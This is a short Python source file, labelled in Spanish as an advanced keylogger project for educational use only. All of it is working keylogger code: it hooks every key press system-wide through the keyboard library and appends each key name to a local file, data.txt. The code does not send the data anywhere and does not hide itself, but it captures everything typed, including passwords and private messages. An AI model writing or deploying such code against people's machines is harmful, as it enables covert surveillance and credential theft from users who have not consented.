##############################################################################################
### Project: KEYLOGGER                                                                     ###
### Author: Guillermo Ayllon                                                               ###
### Date: 05/12/2024                                                                       ###
### Vers: 1.0                                                                              ###
### Level: Advanced                                                                        ###
### Description: keylogger en Python.                                                      ###
##############################################################################################

## SOLO PARA USO EDUCATIVO USALO CON RESPONSABILIDAD

import keyboard

def keyPressed(key):
    
    with open('data.txt', 'a') as file:
        
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)
keyboard.on_press(keyPressed)
keyboard.wait()                                                                                                 